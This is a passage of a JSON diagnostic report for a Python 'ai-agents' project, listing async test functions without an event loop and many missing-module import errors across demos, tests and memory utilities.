          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_extract_patterns",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_record_execution",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_analyze_trends",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_detect_bottlenecks",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_select_optimal_agents",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_select_agent_team",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_selection",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_capability_match",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_optimize_allocation",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_cost_optimization",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_calculate_scaling_needs",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_orchestrate_task",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_learn_from_execution_failure",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_learn_from_execution_success",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_recommend_strategy",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_analyze_complexity",
          "issue": "no_event_loop"
        },
        {
          "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\unit\\test_enhanced_meta_orchestrator.py",
          "function": "mock_analyze_complexity",
          "issue": "no_event_loop"
        }
      ]
    },
    "summary": {
      "total_issues": 529,
      "total_warnings": 3196,
      "critical_issues": 529,
      "diagnosis_duration": "30.03s",
      "timestamp": "2025-09-05T17:30:48.227104"
    },
    "all_issues": [
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\compatibility.py",
        "issue": "Module not found: core.integration.master_controller",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:22.460363"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\compatibility.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:22.463142"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.702874"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\orchestrator.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.719761"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\orchestrator.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.721148"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "issue": "Module not found: meta_demo.demo_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.792222"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "issue": "Module not found: meta_demo.coordination",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.800699"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "issue": "Module not found: meta_demo.business_impact",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.805963"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "issue": "Module not found: meta_demo.visualization",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.812018"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "issue": "Module not found: meta_demo.business_impact",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:24.818272"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\__init__.py",
        "issue": "Module not found: shared",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:27.581682"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\__init__.py",
        "issue": "Module not found: autonomous",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:27.582452"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\__init__.py",
        "issue": "Module not found: reasoning",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:27.583081"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\__init__.py",
        "issue": "Module not found: security",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:27.583697"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\__init__.py",
        "issue": "Module not found: integration",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:27.584324"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: components.performance_monitor",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.540278"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: components.roi_analytics",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.540984"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: components.document_intelligence",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.541659"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: components.real_time_charts",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.542392"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: services.data_service",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.543104"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: utils.auth",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.543201"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "issue": "Module not found: utils.formatting",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.543289"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.658653"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "issue": "Module not found: core.integration.master_controller",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.682705"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "issue": "Module not found: core.integration.deployment_manager",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.700087"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\deployment\\autonomous_deploy.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:28.749392"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "issue": "Module not found: examples.demo_agents.purchase_order_agent",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.052722"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "issue": "Module not found: examples.demo_agents.contract_analyzer",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.053152"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "issue": "Module not found: examples.demo_agents.document_classifier",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.053559"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "issue": "Module not found: examples.demo_integrations.quickbooks_connector",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.053902"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\enterprise_integration_demo.py",
        "issue": "Module not found: examples.demo_analytics.roi_calculator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.054243"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_autonomous_demo.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.069359"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "issue": "Module not found: core.integration.master_controller",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.089878"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "issue": "Module not found: core.integration.deployment_manager",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.093653"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\examples\\phase7_complete_demo.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.112318"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "issue": "Module not found: core.integration.master_controller",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.188072"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.223856"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "issue": "Module not found: core.performance.high_performance_optimization",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.262262"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "issue": "Module not found: core.security.security_validator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.262473"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "issue": "Module not found: meta_demo.demo_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.281431"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "issue": "Module not found: meta_demo.web_interface",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.289946"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "issue": "Module not found: meta_demo.coordination",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.298348"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\launch_demo.py",
        "issue": "Module not found: meta_demo.business_impact",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.309026"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "issue": "Module not found: demo_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.346091"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\__init__.py",
        "issue": "Module not found: demo_engine",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.352058"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\__init__.py",
        "issue": "Module not found: web_interface",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.353204"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\__init__.py",
        "issue": "Module not found: coordination",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.358212"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\__init__.py",
        "issue": "Module not found: business_impact",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.359131"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\__init__.py",
        "issue": "Module not found: environments",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.360649"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\__init__.py",
        "issue": "Module not found: algorithms",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.361485"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\__init__.py",
        "issue": "Module not found: curriculum",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.362333"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\__init__.py",
        "issue": "Module not found: training",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.363784"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\__init__.py",
        "issue": "Module not found: evaluation",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.365220"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\__init__.py",
        "issue": "Module not found: monitoring",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.366729"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "issue": "Module not found: core.performance.high_performance_optimization",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.442379"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "issue": "Module not found: core.performance.high_performance_optimization",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.447293"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\conftest.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.741021"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.809784"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.811083"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.842599"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_phase7_autonomous.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.873815"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "issue": "Module not found: tools.safe_exec_tool",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.885149"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\distributed_memory.py",
        "issue": "Module not found: vector_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.889910"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\memory_consolidator.py",
        "issue": "Module not found: vector_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.891938"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\pattern_extractor.py",
        "issue": "Module not found: vector_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.894063"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\semantic_search.py",
        "issue": "Module not found: vector_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.897527"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Module not found: chromadb",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.907791"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Module not found: faiss",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.908753"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\__init__.py",
        "issue": "Module not found: vector_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.917282"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\__init__.py",
        "issue": "Module not found: semantic_search",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.918326"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\__init__.py",
        "issue": "Module not found: distributed_memory",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.919302"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\__init__.py",
        "issue": "Module not found: pattern_extractor",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.920239"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\__init__.py",
        "issue": "Module not found: memory_consolidator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.921088"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\__init__.py",
        "issue": "Module not found: behavior_validator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.959998"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\__init__.py",
        "issue": "Module not found: performance_benchmarks",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:29.960901"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\conftest.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.910846"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_autonomous_orchestration.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.931985"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.956727"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_integration.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.958017"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "issue": "Module not found: resource",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.995232"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "issue": "Module not found: core.autonomous.orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.997776"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_performance.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:30.999588"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_security.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.065994"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\test_self_modification.py",
        "issue": "Module not found: core.autonomous.self_modification",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.079575"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_invoice_processor.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.100323"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.105730"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\python\\test_orchestrator_comprehensive.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.113301"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.203322"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.207374"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.210224"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.212872"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.215426"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.220694"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.224887"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.227627"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.230231"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.233355"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.241554"
      },
      {
        "category": "MISSING_MODULE",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\quick_test_report.py",
        "issue": "Module not found: orchestrator",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:31.250094"
      },
      {
        "category": "MISSING_MODULE",
